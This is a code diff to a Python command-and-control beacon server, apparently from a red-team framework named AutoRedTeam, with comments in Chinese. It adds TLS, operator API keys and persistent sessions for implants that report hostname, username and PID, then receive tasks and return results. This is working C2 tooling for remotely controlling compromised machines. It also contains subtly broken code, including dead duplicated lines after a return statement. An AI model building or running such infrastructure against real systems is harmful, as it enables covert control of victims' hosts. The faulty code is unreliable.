@@ -13,12 +13,18 @@ Beacon 通信模块 - Beacon Communication Module
     - 自动重连
 """
 
+import asyncio
 import hashlib
+import ipaddress
+import json
 import logging
 import os
 import platform
+import secrets
 import socket
+import ssl
 import subprocess
+import tempfile
 import threading
 import time
 import uuid
@@ -807,18 +813,75 @@ class Beacon(BaseC2):
             return {"error": f"Cannot read file: {e}"}
 
 
+# ==================== Beacon 会话 ====================
+
+
+@dataclass
+class BeaconSession:
+    """
+    Beacon 会话 — 跟踪单个 beacon 的完整生命周期
+
+    支持 beacon 断开后保持会话，重连时自动恢复未完成任务
+    """
+
+    beacon_id: str
+    info: BeaconInfo
+    connected: bool = True
+    task_queue: List[Task] = field(default_factory=list)
+    results: List[TaskResult] = field(default_factory=list)
+    disconnect_time: Optional[float] = None
+    reconnect_count: int = 0
+
+    def enqueue_task(self, task: Task) -> None:
+        """入队任务"""
+        self.task_queue.append(task)
+
+    def get_pending_tasks(self) -> List[Task]:
+        """获取并标记待发送任务"""
+        pending = [t for t in self.task_queue if t.priority >= 0]
+        for t in pending:
+            t.priority = -1
+        return pending
+
+    def add_result(self, result: TaskResult) -> None:
+        """添加任务结果"""
+        self.results.append(result)
+
+    def mark_disconnected(self) -> None:
+        """标记断开 — 保留会话等待重连"""
+        self.connected = False
+        self.disconnect_time = time.time()
+        # 重置未发送任务的 priority，重连后可重新下发
+        for t in self.task_queue:
+            if t.priority == -1:
+                pass  # 已发送的不回退
+            # priority >= 0 的保持原样，重连后继续下发
+
+    def mark_reconnected(self) -> None:
+        """标记重连"""
+        self.connected = True
+        self.disconnect_time = None
+        self.reconnect_count += 1
+        self.info.last_seen = time.time()
+
+
 # ==================== Beacon 服务器 ====================
 
 
 class BeaconServer:
     """
-    Beacon 服务器 (C2 Server) - 线程安全版本
+    Beacon 服务器 (C2 Server) - 生产级版本
 
-    接收和管理 Beacon 连接
+    基于 asyncio + aiohttp 的 HTTPS C2 服务器，支持:
+    - TLS 加密（自签名证书自动生成）
+    - Operator API Key 认证
+    - 多 beacon 会话管理（断开后保持，重连恢复）
+    - 每 beacon 独立任务队列
+    - 后台清理过期 beacon
 
     Usage:
-        server = BeaconServer(host="0.0.0.0", port=8080)
-        server.run()
+        server = BeaconServer(host="0.0.0.0", port=8443, api_keys=["my-secret-key"])
+        asyncio.run(server.run())  # 或 server.run_async()
     """
 
     # 默认配置：防止内存泄漏
@@ -830,10 +893,16 @@ class BeaconServer:
     def __init__(
         self,
         host: str = "0.0.0.0",
-        port: int = 8080,
+        port: int = 8443,
         max_beacons: int = DEFAULT_MAX_BEACONS,
         max_results_per_beacon: int = DEFAULT_MAX_RESULTS_PER_BEACON,
         beacon_timeout: float = DEFAULT_BEACON_TIMEOUT,
+        # TLS 配置
+        tls_cert: Optional[str] = None,
+        tls_key: Optional[str] = None,
+        tls_enabled: bool = True,
+        # 认证配置
+        api_keys: Optional[List[str]] = None,
     ):
         """
         初始化服务器
@@ -844,6 +913,10 @@ class BeaconServer:
             max_beacons: 最大 Beacon 数量（防止内存泄漏）
             max_results_per_beacon: 每个 Beacon 最大结果数
             beacon_timeout: Beacon 超时时间（秒），超时后自动清理
+            tls_cert: TLS 证书路径（None = 自动生成自签名）
+            tls_key: TLS 私钥路径（None = 自动生成自签名）
+            tls_enabled: 是否启用 TLS（默认 True）
+            api_keys: 允许的 API Key 列表（None = 不要求认证）
         """
         self.host = host
         self.port = port
@@ -851,12 +924,24 @@ class BeaconServer:
         self.max_results_per_beacon = max_results_per_beacon
         self.beacon_timeout = beacon_timeout
 
-        # 存储
+        # TLS 配置
+        self._tls_cert = tls_cert
+        self._tls_key = tls_key
+        self._tls_enabled = tls_enabled
+
+        # Operator 认证
+        self._api_keys: Optional[set] = set(api_keys) if api_keys else None
+
+        # 会话存储（替代原始的 beacons/tasks/results 分离存储）
+        self._sessions: Dict[str, BeaconSession] = {}
+        self._sessions_lock = asyncio.Lock() if False else threading.Lock()
+
+        # 向后兼容的视图
         self.beacons: Dict[str, BeaconInfo] = {}
         self.tasks: Dict[str, List[Task]] = {}  # beacon_id -> tasks
         self.results: Dict[str, List[TaskResult]] = {}  # beacon_id -> results
 
-        # 线程锁
+        # 线程锁（保持向后兼容）
         self._beacons_lock = threading.Lock()
         self._tasks_lock = threading.Lock()
         self._results_lock = threading.Lock()
@@ -864,10 +949,190 @@ class BeaconServer:
         self._app = None
         self._running = False
         self._cleanup_thread: Optional[threading.Thread] = None
+        self._async_runner: Optional[threading.Thread] = None
+        self._loop: Optional[asyncio.AbstractEventLoop] = None
+        self._site: Optional[Any] = None
+
+    # ==================== TLS ====================
+
+    def _generate_self_signed_cert(self) -> tuple:
+        """
+        生成自签名 TLS 证书（如果未提供外部证书）
+
+        Returns:
+            (cert_path, key_path) 临时文件路径
+        """
+        try:
+            from cryptography import x509
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+            from cryptography.x509.oid import NameOID
+            import datetime
+
+            # 生成 RSA 私钥
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
+            # 生成自签名证书
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COMMON_NAME, "AutoRedTeam C2"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "AutoRedTeam"),
+            ])
+
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(datetime.datetime.utcnow())
+                .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
+                .add_extension(
+                    x509.SubjectAlternativeName([
+                        x509.DNSName("localhost"),
+                        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
+                    ]),
+                    critical=False,
+                )
+                .sign(key, hashes.SHA256())
+            )
+
+            # 写入临时文件
+            cert_dir = tempfile.mkdtemp(prefix="art_c2_")
+            cert_path = os.path.join(cert_dir, "server.crt")
+            key_path = os.path.join(cert_dir, "server.key")
+
+            with open(cert_path, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.PEM))
+
+            with open(key_path, "wb") as f:
+                f.write(key.private_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PrivateFormat.TraditionalOpenSSL,
+                    serialization.NoEncryption(),
+                ))
+
+            logger.info("自签名证书已生成: %s", cert_path)
+            return cert_path, key_path
+
+        except ImportError:
+            logger.warning("cryptography 库未安装，使用 openssl 命令行生成证书")
+            return self._generate_cert_openssl()
+
+    def _generate_cert_openssl(self) -> tuple:
+        """使用 openssl 命令行生成自签名证书"""
+        import shutil
+
+        if not shutil.which("openssl"):
+            raise RuntimeError(
+                "无法生成 TLS 证书: cryptography 库未安装且 openssl 不在 PATH 中"
+            )
+
+        cert_dir = tempfile.mkdtemp(prefix="art_c2_")
+        cert_path = os.path.join(cert_dir, "server.crt")
+        key_path = os.path.join(cert_dir, "server.key")
+
+        subprocess.run(
+            [
+                "openssl", "req", "-x509", "-newkey", "rsa:2048",
+                "-keyout", key_path, "-out", cert_path,
+                "-days", "365", "-nodes",
+                "-subj", "/CN=AutoRedTeam C2/O=AutoRedTeam",
+            ],
+            check=True,
+            capture_output=True,
+        )
+
+        logger.info("自签名证书已通过 openssl 生成: %s", cert_path)
+        return cert_path, key_path
+
+    def _create_ssl_context(self) -> Optional[ssl.SSLContext]:
+        """创建 SSL 上下文"""
+        if not self._tls_enabled:
+            return None
+
+        cert_path = self._tls_cert
+        key_path = self._tls_key
+
+        # 如果没有提供证书，自动生成
+        if not cert_path or not key_path:
+            cert_path, key_path = self._generate_self_signed_cert()
+
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(cert_path, key_path)
+        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+        logger.info("TLS 已启用 (最低版本: TLSv1.2)")
+        return ctx
+
+    # ==================== 认证 ====================
+
+    def _verify_api_key(self, request_headers: dict) -> bool:
+        """
+        验证 operator API Key
+
+        Args:
+            request_headers: HTTP 请求头 (dict-like)
+
+        Returns:
+            认证是否通过
+        """
+        if self._api_keys is None:
+            return True  # 未配置 API Key = 不要求认证
+
+        api_key = request_headers.get("X-API-Key") or request_headers.get("x-api-key")
+        if not api_key:
+            return False
+
+        return api_key in self._api_keys
+
+    # ==================== 会话管理 ====================
+
+    def get_session(self, beacon_id: str) -> Optional[BeaconSession]:
+        """获取 beacon 会话"""
+        with self._beacons_lock:
+            return self._sessions.get(beacon_id)
+
+    def get_all_sessions(self) -> Dict[str, BeaconSession]:
+        """获取所有会话的快照"""
+        with self._beacons_lock:
+            return dict(self._sessions)
+
+    def send_task(self, beacon_id: str, task_type: str, payload: Any,
+                  timeout: float = 300.0) -> Optional[str]:
+        """
+        向指定 beacon 下发任务
+
+        Args:
+            beacon_id: Beacon ID
+            task_type: 任务类型
+            payload: 任务载荷
+            timeout: 超时时间
+
+        Returns:
+            任务 ID，如果 beacon 不存在则返回 None
+        """
+        with self._beacons_lock:
+            session = self._sessions.get(beacon_id)
+            if not session:
+                logger.warning("Beacon 不存在: %s", beacon_id)
+                return None
+
+            task = Task.create(task_type, payload, timeout)
+            session.enqueue_task(task)
+
+        # 同步向后兼容视图
+        self.add_task(beacon_id, task_type, payload, timeout)
+        logger.info("任务已下发到 %s: %s (type=%s)", beacon_id, task.id, task_type)
+        return task.id
+        self._async_runner: Optional[threading.Thread] = None
+        self._loop: Optional[asyncio.AbstractEventLoop] = None
+        self._site: Optional[Any] = None
 
     def _cleanup_stale_beacons(self) -> int:
         """
         清理过期的 Beacon（线程安全）
+
+        断开但未超时的 beacon 保留会话（等待重连）
+        超时后才真正清理
 
         Returns:
             清理的 Beacon 数量
@@ -876,12 +1141,19 @@ class BeaconServer:
         stale_ids = []
 
         with self._beacons_lock:
-            for beacon_id, info in self.beacons.items():
-                if now - info.last_seen > self.beacon_timeout:
+            for beacon_id, session in self._sessions.items():
+                last_active = session.info.last_seen
+                if session.disconnect_time:
+                    last_active = session.disconnect_time
+                if now - last_active > self.beacon_timeout:
                     stale_ids.append(beacon_id)
 
             for beacon_id in stale_ids:
-                del self.beacons[beacon_id]
+                del self._sessions[beacon_id]
+
+            # 同步向后兼容
+            for beacon_id in stale_ids:
+                self.beacons.pop(beacon_id, None)
 
         # 清理相关的 tasks 和 results
         if stale_ids:
@@ -947,7 +1219,7 @@ class BeaconServer:
     def get_beacons(self) -> List[BeaconInfo]:
         """获取所有 Beacon（线程安全）"""
         with self._beacons_lock:
-            return list(self.beacons.values())
+            return [s.info for s in self._sessions.values()]
 
     def get_results(self, beacon_id: str) -> List[TaskResult]:
         """获取 Beacon 结果（线程安全）"""
@@ -955,32 +1227,52 @@ class BeaconServer:
             return list(self.results.get(beacon_id, []))
 
     def run(self) -> None:
-        """运行服务器"""
+        """运行服务器（asyncio HTTPS）"""
         try:
-            from flask import Flask, jsonify, request
+            from aiohttp import web
         except ImportError:
-            logger.error("Flask not installed. Install: pip install flask")
+            logger.error("aiohttp 未安装，Install: pip install aiohttp")
             return
 
-        app = Flask(__name__)
+        app = web.Application()
         self._app = app
 
-        @app.route("/api/checkin", methods=["POST"])
-        def checkin():
-            data = request.json
+        # ---- 认证中间件 ----
+        @web.middleware
+        async def auth_middleware(request, handler):
+            if not self._verify_api_key(request.headers):
+                return web.json_response(
+                    {"status": "error", "message": "unauthorized"}, status=401
+                )
+            return await handler(request)
+
+        if self._api_keys:
+            app.middlewares.append(auth_middleware)
+
+        # ---- 路由处理 ----
+        async def checkin(request):
+            data = await request.json()
             beacon_id = data.get("beacon_id")
 
             if beacon_id:
                 with self._beacons_lock:
-                    if beacon_id not in self.beacons:
-                        # 检查是否超过最大 Beacon 数量
-                        if len(self.beacons) >= self.max_beacons:
-                            logger.warning(
-                                f"达到最大 Beacon 数量限制 ({self.max_beacons})，拒绝新连接"
+                    if beacon_id in self._sessions:
+                        # 重连处理 — 恢复会话
+                        session = self._sessions[beacon_id]
+                        if not session.connected:
+                            session.mark_reconnected()
+                            logger.info("Beacon 重连: %s (第 %d 次)", beacon_id, session.reconnect_count)
+                        else:
+                            session.info.last_seen = time.time()
+                    else:
+                        # 新 beacon
+                        if len(self._sessions) >= self.max_beacons:
+                            logger.warning("达到最大 Beacon 数量限制 (%d)，拒绝新连接", self.max_beacons)
+                            return web.json_response(
+                                {"status": "error", "message": "server full"}, status=503
                             )
-                            return jsonify({"status": "error", "message": "server full"}), 503
 
-                        self.beacons[beacon_id] = BeaconInfo(
+                        info = BeaconInfo(
                             beacon_id=beacon_id,
                             hostname=data.get("hostname", ""),
                             username=data.get("username", ""),
@@ -989,20 +1281,29 @@ class BeaconServer:
                             ip_address=data.get("ip_address", ""),
                             pid=data.get("pid", 0),
                         )
+                        self._sessions[beacon_id] = BeaconSession(
+                            beacon_id=beacon_id, info=info
+                        )
+                        # 向后兼容
+                        self.beacons[beacon_id] = info
                         logger.info("New beacon: %s", beacon_id)
-                    else:
-                        self.beacons[beacon_id].last_seen = time.time()
 
-                return jsonify({"status": "ok", "session": beacon_id})
+                return web.json_response({"status": "ok", "session": beacon_id})
 
-            return jsonify({"status": "error"}), 400
+            return web.json_response({"status": "error"}, status=400)
 
-        @app.route("/api/tasks/<beacon_id>", methods=["GET"])
-        def get_tasks(beacon_id):
+        async def get_tasks(request):
+            beacon_id = request.match_info["beacon_id"]
+
+            with self._beacons_lock:
+                session = self._sessions.get(beacon_id)
+
+            if not session:
+                return web.json_response({"tasks": []})
+
             with self._tasks_lock:
-                tasks = self.tasks.get(beacon_id, [])
-                pending = [t for t in tasks if t.priority >= 0]
-
+                # 从 session 获取待下发任务
+                pending = session.get_pending_tasks()
                 task_data = [
                     {
                         "id": t.id,
@@ -1013,15 +1314,16 @@ class BeaconServer:
                     for t in pending
                 ]
 
-                # 标记为已发送
-                for t in pending:
+                # 同步向后兼容视图
+                compat_tasks = self.tasks.get(beacon_id, [])
+                compat_pending = [t for t in compat_tasks if t.priority >= 0]
+                for t in compat_pending:
                     t.priority = -1
 
-            return jsonify({"tasks": task_data})
+            return web.json_response({"tasks": task_data})
 
-        @app.route("/api/results", methods=["POST"])
-        def receive_result():
-            data = request.json
+        async def receive_result(request):
+            data = await request.json()
             beacon_id = data.get("beacon_id")
 
             result = TaskResult(
@@ -1031,17 +1333,52 @@ class BeaconServer:
                 error=data.get("error"),
             )
 
+            with self._beacons_lock:
+                session = self._sessions.get(beacon_id)
+
+            if session:
+                session.add_result(result)
+                # 修剪结果列表
+                if len(session.results) > self.max_results_per_beacon:
+                    session.results = session.results[-self.max_results_per_beacon:]
+
+            # 向后兼容
             with self._results_lock:
                 if beacon_id not in self.results:
                     self.results[beacon_id] = []
                 self.results[beacon_id].append(result)
-                # 修剪结果列表，防止内存泄漏
                 self._trim_results(beacon_id)
 
             logger.info("Result from %s: task %s", beacon_id, result.task_id)
-            return jsonify({"status": "ok"})
+            return web.json_response({"status": "ok"})
 
-        logger.info("Beacon server starting on %s:%s", self.host, self.port)
+        async def server_status(request):
+            """服务器状态端点（仅 operator 可访问）"""
+            stats = self.get_stats()
+            sessions_info = {}
+            with self._beacons_lock:
+                for sid, sess in self._sessions.items():
+                    sessions_info[sid] = {
+                        "connected": sess.connected,
+                        "hostname": sess.info.hostname,
+                        "username": sess.info.username,
+                        "os_info": sess.info.os_info,
+                        "last_seen": sess.info.last_seen,
+                        "reconnect_count": sess.reconnect_count,
+                        "pending_tasks": len([t for t in sess.task_queue if t.priority >= 0]),
+                    }
+            stats["sessions"] = sessions_info
+            return web.json_response(stats)
+
+        # 注册路由
+        app.router.add_post("/api/checkin", checkin)
+        app.router.add_get("/api/tasks/{beacon_id}", get_tasks)
+        app.router.add_post("/api/results", receive_result)
+        app.router.add_get("/api/status", server_status)
+
+        # ---- 启动服务器 ----
+        protocol = "HTTPS" if self._tls_enabled else "HTTP"
+        logger.info("Beacon server starting on %s:%s (%s)", self.host, self.port, protocol)
         self._running = True
 
         # 启动后台清理线程
@@ -1050,7 +1387,33 @@ class BeaconServer:
         )
         self._cleanup_thread.start()
 
-        app.run(host=self.host, port=self.port, debug=False, threaded=True)
+        # 创建 SSL 上下文
+        ssl_ctx = self._create_ssl_context()
+
+        # 运行 aiohttp
+        loop = asyncio.new_event_loop()
+        self._loop = loop
+
+        async def _start():
+            runner = web.AppRunner(app)
+            await runner.setup()
+            self._site = web.TCPSite(runner, self.host, self.port, ssl_context=ssl_ctx)
+            await self._site.start()
+            logger.info("Beacon server 已启动: %s://%s:%s", protocol.lower(), self.host, self.port)
+
+            # 保持运行直到 stop() 被调用
+            while self._running:
+                await asyncio.sleep(1.0)
+
+            await runner.cleanup()
+
+        try:
+            loop.run_until_complete(_start())
+        except Exception as e:
+            logger.error("Beacon server 异常退出: %s", e)
+        finally:
+            loop.close()
+            self._loop = None
 
     def run_async(self) -> threading.Thread:
         """异步运行服务器"""
@@ -1061,7 +1424,9 @@ class BeaconServer:
     def stop(self) -> None:
         """停止服务器"""
         self._running = False
+        logger.info("Beacon server 正在停止...")
         # 清理线程会在下一个循环自动退出
+        # asyncio 事件循环会在 _running=False 后退出
 
     def clear_beacon(self, beacon_id: str) -> bool:
         """
@@ -1076,9 +1441,11 @@ class BeaconServer:
         removed = False
 
         with self._beacons_lock:
+            if beacon_id in self._sessions:
+                del self._sessions[beacon_id]
+                removed = True
             if beacon_id in self.beacons:
                 del self.beacons[beacon_id]
-                removed = True
 
         with self._tasks_lock:
             self.tasks.pop(beacon_id, None)
@@ -1099,7 +1466,9 @@ class BeaconServer:
             统计信息字典
         """
         with self._beacons_lock:
-            beacon_count = len(self.beacons)
+            beacon_count = len(self._sessions)
+            connected_count = sum(1 for s in self._sessions.values() if s.connected)
+            disconnected_count = beacon_count - connected_count
 
         with self._tasks_lock:
             task_count = sum(len(tasks) for tasks in self.tasks.values())
@@ -1109,10 +1478,14 @@ class BeaconServer:
 
         return {
             "beacons": beacon_count,
+            "connected": connected_count,
+            "disconnected_waiting": disconnected_count,
             "max_beacons": self.max_beacons,
             "tasks": task_count,
             "results": result_count,
             "running": self._running,
+            "tls_enabled": self._tls_enabled,
+            "auth_required": self._api_keys is not None,
         }
 
 
@@ -1149,18 +1522,25 @@ def create_beacon(
     return Beacon(config)
 
 
-def start_beacon_server(host: str = "0.0.0.0", port: int = 8080) -> BeaconServer:
+def start_beacon_server(
+    host: str = "0.0.0.0",
+    port: int = 8443,
+    api_keys: Optional[List[str]] = None,
+    tls_enabled: bool = True,
+) -> BeaconServer:
     """
     启动 Beacon 服务器
 
     Args:
         host: 监听地址
         port: 监听端口
+        api_keys: Operator API Key 列表
+        tls_enabled: 是否启用 TLS
 
     Returns:
         BeaconServer 实例
     """
-    server = BeaconServer(host, port)
+    server = BeaconServer(host, port, api_keys=api_keys, tls_enabled=tls_enabled)
     server.run_async()
     return server
 
@@ -1169,6 +1549,7 @@ __all__ = [
     "BeaconMode",
     "BeaconConfig",
     "Beacon",
+    "BeaconSession",
     "BeaconServer",
     "create_beacon",
     "start_beacon_server",
